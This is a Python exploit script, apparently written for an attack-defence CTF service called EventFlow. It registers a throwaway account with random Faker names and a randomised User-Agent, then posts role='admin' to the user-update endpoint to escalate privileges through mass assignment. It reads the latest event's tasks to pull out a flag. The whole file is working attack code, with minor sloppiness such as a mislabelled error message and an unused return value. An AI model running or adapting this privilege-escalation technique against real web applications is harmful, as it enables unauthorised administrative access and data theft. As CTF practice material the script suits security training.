import random
import string
from faker import Faker
from fake_useragent import UserAgent
import requests
import sys

fake = Faker(['en_US', 'fr_FR', 'es_ES'])

PORT = 1337
ua = UserAgent()

USER_AGENT = ua.random

host = sys.argv[1]


def get_creds():
    chars = string.ascii_letters + string.digits + '!@#$%^&*()_-+=[]{}'
    length = random.randint(6, 8)

    username = fake.name().replace('-', ' ')
    password = ''.join(random.choice(chars) for _ in range(length))
    first_name, second_name = username.split(' ')[0], ' '.join([i for i in username.split(' ')[1:]])
    email = username.replace(' ', '_') + '@' + 'eventflow.com'

    return username, password, first_name, second_name, email


def register(host):
    try:
        while True:
            username, password, first_name, second_name, email = get_creds()
            

            response = requests.post(
                f'http://{host}:{PORT}/api/register',
                json={
                    'username': username,
                    'password': password,
                    'email':  email,
                    'first_name': first_name,
                    'second_name': second_name
                },
                headers={'Content-Type': 'application/json', 'User-Agent': USER_AGENT}
            )

            data = response.json()
            if 'Username already exists' not in data['message']:
                return data['token']

    except Exception as err:
        print(f"Error registering: {err}")
        sys.exit(1)


def update_user(token):
    try:
        response = requests.post(
            f'http://{host}:{PORT}/api/user/update',
            json={
                'role': 'admin'
            },
            headers={'Authorization': f'Bearer {token}', 'User-Agent': USER_AGENT}
        )
    except Exception as err:
        print(f"Error get eventing: {err}")
        sys.exit(1)
 

def get_event(host, token):
    try:
        response = requests.get(
            f'http://{host}:{PORT}/api/events',
            headers={'Authorization': f'Bearer {token}', 'User-Agent': USER_AGENT}
        )

        data = response.json()[-1]
        return data['id']
    except Exception as err:
        print(f"Error get eventing: {err}")
        sys.exit(1)


def get_flag(token, id):
    try:
        response = requests.get(
            f'http://{host}:{PORT}/api/event/{id}/tasks',
            headers={'Authorization': f'Bearer {token}', 'User-Agent': USER_AGENT}
        )

        data = response.json()[0]
        return data['text']
    except Exception as err:
        print(f"Error get flag: {err}")
        sys.exit(1)

def run(): 

    token = register(host)
    id = get_event(host, token)

    invitecode = update_user(token)

    flag = get_flag(token, id)
    print(flag, flush=True)


if __name__ == "__main__":
    run()